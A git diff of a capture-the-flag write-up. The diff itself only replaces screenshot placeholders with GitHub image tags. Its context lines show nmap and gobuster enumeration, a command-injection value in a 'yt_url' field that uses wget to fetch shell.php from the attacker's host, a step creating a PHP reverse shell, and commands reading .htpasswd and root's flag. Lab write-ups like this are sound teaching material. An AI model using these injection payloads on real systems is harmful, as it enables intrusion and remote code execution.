@@ -14,7 +14,7 @@
 nmap -sV IP
 ```
 
-[SCREEN01]
+<img width="904" height="87" alt="SCREEN01" src="https://github.com/user-attachments/assets/bcaee6ee-4485-4ff2-816f-4eaecebf3348" />
 
 2. Conduct directory enumeration using Gobuster to discover hidden directories
    - The enumeration reveals the secret folder: `/admin`
@@ -23,7 +23,7 @@ nmap -sV IP
 gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-[SCREEN02]
+<img width="549" height="168" alt="SCREEN02" src="https://github.com/user-attachments/assets/effbafbb-a43f-4485-896f-32c8f70d8da9" />
 
 ---
 
@@ -41,7 +41,7 @@ _The folder is protected by Apache authentication._
 
    - `` yt_url=`wget${IFS}http://IP:8000/shell.php` ``
 
-[SCREEN03]
+<img width="1053" height="503" alt="SCREEN03" src="https://github.com/user-attachments/assets/c36bea8e-031e-40d8-97e2-949834d06d51" />
 
 4. Create a PHP reverse shell script on the attacking machine
 
@@ -79,7 +79,7 @@ cat .htpasswd
 cat flag.txt
 ```
 
-[SCREEN04]
+<img width="721" height="412" alt="SCREEN04" src="https://github.com/user-attachments/assets/44cb69ef-a9f3-419a-b6f0-e05306097f3b" />
 
 ---
 
@@ -105,4 +105,4 @@ ls -la /root
 cat /root/root.txt
 ```
 
-[SCREEN05]
+<img width="718" height="381" alt="SCREEN05" src="https://github.com/user-attachments/assets/0dc531b1-61fb-47a5-a652-31234e09fe30" />
